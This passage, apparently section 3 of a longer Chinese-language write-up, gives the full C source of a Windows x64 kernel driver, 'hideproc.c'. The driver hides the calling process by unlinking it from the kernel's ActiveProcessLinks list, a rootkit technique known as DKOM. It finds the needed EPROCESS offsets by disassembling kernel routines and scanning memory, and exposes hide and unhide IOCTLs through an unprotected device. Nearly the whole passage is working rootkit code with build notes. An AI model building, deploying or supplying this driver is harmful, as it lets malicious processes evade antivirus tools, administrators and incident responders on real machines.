## 3. 驱动源码

`hideproc.c`，WDK 10，x64，`/INTEGRITYCHECK`。

```c
#include <ntifs.h>

#define IOCTL_HP_HIDE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HP_UNHIDE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HP_QUERY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _HP_STATE {
    PEPROCESS           Target;
    HANDLE              Pid;
    LIST_ENTRY          Saved;          /* 摘链前的 Flink/Blink, 仅诊断用 */
    LIST_ENTRY          SelfCopy;
    ULONG               AplOff;
    ULONG               PidOff;
    BOOLEAN             Hidden;
} HP_STATE;

static HP_STATE       g_State;
static FAST_MUTEX     g_Lock;
static PEPROCESS      g_System    = NULL;
static PDEVICE_OBJECT g_Device    = NULL;
static UNICODE_STRING g_SymLink;

/* ---------- 工具 ---------- */

static PUCHAR HpResolveJumps(PUCHAR p, int n)
{
    while (n-- > 0) {
        if (p[0] == 0xE9) {                       /* jmp rel32 */
            p = p + 5 + *(INT32 *)(p + 1);
            continue;
        }
        if (p[0] == 0x48 && p[1] == 0xFF && p[2] == 0x25) {   /* jmp [rip+disp32] */
            p = *(PUCHAR *)(p + 6 + *(INT32 *)(p + 3));
            continue;
        }
        break;
    }
    return p;
}

/* 从 PsGetProcessId 反汇编出 UniqueProcessId 偏移 */
static ULONG HpFindPidOffset(VOID)
{
    UNICODE_STRING s;
    PUCHAR p;
    ULONG  i;

    RtlInitUnicodeString(&s, L"PsGetProcessId");
    p = (PUCHAR)MmGetSystemRoutineAddress(&s);
    if (!p) return 0;
    p = HpResolveJumps(p, 2);

    for (i = 0; i < 48; i++) {
        if (p[i] == 0x48 && p[i + 1] == 0x8B && p[i + 2] == 0x81)   /* mov rax,[rcx+d32] */
            return *(ULONG *)(p + i + 3);
        if (p[i] == 0x8B && p[i + 1] == 0x81)                        /* mov eax,[rcx+d32] */
            return *(ULONG *)(p + i + 2);
    }
    return 0;
}

/* 结构扫描 ActiveProcessLinks 偏移 */
static ULONG HpFindAplOffset(PEPROCESS Self, ULONG PidOff)
{
    PUCHAR base = (PUCHAR)Self;
    ULONG  off;

    if (!PidOff) return 0;

    for (off = 0x100; off < 0x900; off += 8) {
        PLIST_ENTRY e = (PLIST_ENTRY)(base + off);
        PLIST_ENTRY f, b, n;
        ULONG nodes = 0;
        BOOLEAN sawSystem = FALSE, sawSelf = FALSE;

        f = e->Flink; b = e->Blink;
        if (!f || !b) continue;
        if (((ULONG_PTR)f | (ULONG_PTR)b) & 7) continue;
        if ((ULONG_PTR)f < 0xFFFF800000000000ULL) continue;
        if ((ULONG_PTR)b < 0xFFFF800000000000ULL) continue;
        if (!MmIsAddressValid(f) || !MmIsAddressValid(b)) continue;
        if (((PLIST_ENTRY)f)->Blink != e) continue;
        if (((PLIST_ENTRY)b)->Flink != e) continue;

        for (n = f; nodes < 256; nodes++) {
            PUCHAR  proc;
            HANDLE  pid;

            if (!MmIsAddressValid(n)) break;
            proc = (PUCHAR)n - off;
            if (!MmIsAddressValid(proc + PidOff)) break;

            pid = *(HANDLE *)(proc + PidOff);
            if (pid == NULL) break;
            if (((ULONG_PTR)pid) & 3) break;
            if ((ULONG_PTR)pid > 0x100000) break;

            if (pid == (HANDLE)4)  sawSystem = TRUE;
            if (proc == (PUCHAR)Self) sawSelf = TRUE;

            n = ((PLIST_ENTRY)n)->Flink;
            if (n == f) break;
        }

        if (nodes >= 8 && sawSystem && sawSelf)
            return off;
    }
    return 0;
}

/* ---------- 拼链 ---------- */

static VOID HpUnlink(HP_STATE *st)
{
    PLIST_ENTRY e = (PLIST_ENTRY)((PUCHAR)st->Target + st->AplOff);

    if (e->Flink == e && e->Blink == e) return;      /* 已摘除 */

    st->Saved  = *e;
    st->SelfCopy = *e;

    e->Blink->Flink = e->Flink;
    e->Flink->Blink = e->Blink;
    e->Flink = e;
    e->Blink = e;                                    /* 自环, 保证 PspProcessDelete 安全 */
}

static VOID HpRelink(HP_STATE *st)
{
    PLIST_ENTRY self   = (PLIST_ENTRY)((PUCHAR)st->Target + st->AplOff);
    PLIST_ENTRY anchor = (PLIST_ENTRY)((PUCHAR)g_System  + st->AplOff);

    if (self->Flink != self || self->Blink != self) return;   /* 已在链上, 不重复插 */
    if (!MmIsAddressValid(anchor) || !MmIsAddressValid(anchor->Flink)) return;

    InsertTailList(anchor, self);
}

/* ---------- 分发 ---------- */

static NTSTATUS HpDeviceControl(PDEVICE_OBJECT Dev, PIRP Irp)
{
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG    info   = 0;

    UNREFERENCED_PARAMETER(Dev);

    ExAcquireFastMutex(&g_Lock);

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {

    case IOCTL_HP_HIDE: {
        PEPROCESS t = PsGetCurrentProcess();          /* IOCTL 在调用者上下文执行 */

        if (PsGetProcessId(t) == (HANDLE)4) { status = STATUS_ACCESS_DENIED; break; }
        if (g_State.Hidden)                 { status = STATUS_ALREADY_REGISTERED; break; }
        if (!g_State.AplOff)                { status = STATUS_NOT_SUPPORTED; break; }

        g_State.Target = t;
        g_State.Pid    = PsGetProcessId(t);

        KeEnterCriticalRegion();
        HpUnlink(&g_State);
        KeLeaveCriticalRegion();

        g_State.Hidden = TRUE;
        status = STATUS_SUCCESS;
        break;
    }

    case IOCTL_HP_UNHIDE: {
        if (!g_State.Hidden || !g_State.Target) { status = STATUS_NOT_FOUND; break; }

        KeEnterCriticalRegion();
        HpRelink(&g_State);
        KeLeaveCriticalRegion();

        g_State.Hidden = FALSE;
        g_State.Target = NULL;
        status = STATUS_SUCCESS;
        break;
    }

    case IOCTL_HP_QUERY:
        *(ULONG *)Irp->AssociatedIrp.SystemBuffer = g_State.AplOff;
        info = sizeof(ULONG);
        status = STATUS_SUCCESS;
        break;
    }

    ExReleaseFastMutex(&g_Lock);

    Irp->IoStatus.Status      = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS HpCreateClose(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/* ---------- 入口 / 卸载 ---------- */

VOID HpUnload(PDRIVER_OBJECT Driver)
{
    UNREFERENCED_PARAMETER(Driver);

    ExAcquireFastMutex(&g_Lock);

    if (g_State.Hidden && g_State.Target) {
        PEPROCESS p = NULL;

        /* 目标还活着吗? 死了就只清状态, 绝不重链死对象 */
        if (NT_SUCCESS(PsLookupProcessByProcessId(g_State.Pid, &p))) {
            if (p == g_State.Target) {
                KeEnterCriticalRegion();
                HpRelink(&g_State);
                KeLeaveCriticalRegion();
            }
            ObDereferenceObject(p);
        }
        g_State.Hidden = FALSE;
        g_State.Target = NULL;
    }

    ExReleaseFastMutex(&g_Lock);

    if (g_SymLink.Buffer) IoDeleteSymbolicLink(&g_SymLink);
    if (g_Device)         IoDeleteDevice(g_Device);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
{
    NTSTATUS        st;
    UNICODE_STRING  devName;
    PVOID          *pSys;
    HANDLE          pid;

    UNREFERENCED_PARAMETER(RegPath);

    RtlZeroMemory(&g_State, sizeof(g_State));
    ExInitializeFastMutex(&g_Lock);
    Driver->DriverUnload = HpUnload;

    /* PsInitialSystemProcess 是导出变量, MmGetSystemRoutineAddress 给的是变量地址 */
    RtlInitUnicodeString(&devName, L"PsInitialSystemProcess");
    pSys = (PVOID *)MmGetSystemRoutineAddress(&devName);
    if (!pSys) return STATUS_NOT_FOUND;
    g_System = (PEPROCESS)(*pSys);
    if (!g_System) return STATUS_NOT_FOUND;

    g_State.PidOff = HpFindPidOffset();
    if (!g_State.PidOff) return STATUS_NOT_SUPPORTED;

    g_State.AplOff = HpFindAplOffset(PsGetCurrentProcess(), g_State.PidOff);
    if (!g_State.AplOff) g_State.AplOff = HpFindAplOffset(g_System, g_State.PidOff);
    if (!g_State.AplOff) return STATUS_NOT_SUPPORTED;

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
               "[hideproc] PidOff=0x%x AplOff=0x%x System=%p\n",
               g_State.PidOff, g_State.AplOff, g_System);

    RtlInitUnicodeString(&devName, L"\\Device\\HideProc");
    st = IoCreateDevice(Driver, 0, &devName, FILE_DEVICE_UNKNOWN,
                        FILE_DEVICE_SECURE_OPEN, FALSE, &g_Device);
    if (!NT_SUCCESS(st)) return st;

    g_Device->Flags |= DO_BUFFERED_IO;

    RtlInitUnicodeString(&g_SymLink, L"\\??\\HideProc");
    st = IoCreateSymbolicLink(&g_SymLink, &devName);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(g_Device); g_Device = NULL; return st; }

    Driver->MajorFunction[IRP_MJ_CREATE]         = HpCreateClose;
    Driver->MajorFunction[IRP_MJ_CLOSE]          = HpCreateClose;
    Driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HpDeviceControl;
    return STATUS_SUCCESS;
}
```

`PsGetProcessId` / `PsLookupProcessByProcessId` / `MmIsAddressValid` / `MmGetSystemRoutineAddress` 都只需要 `ntifs.h` + `ntoskrnl.lib`，无额外链接依赖。

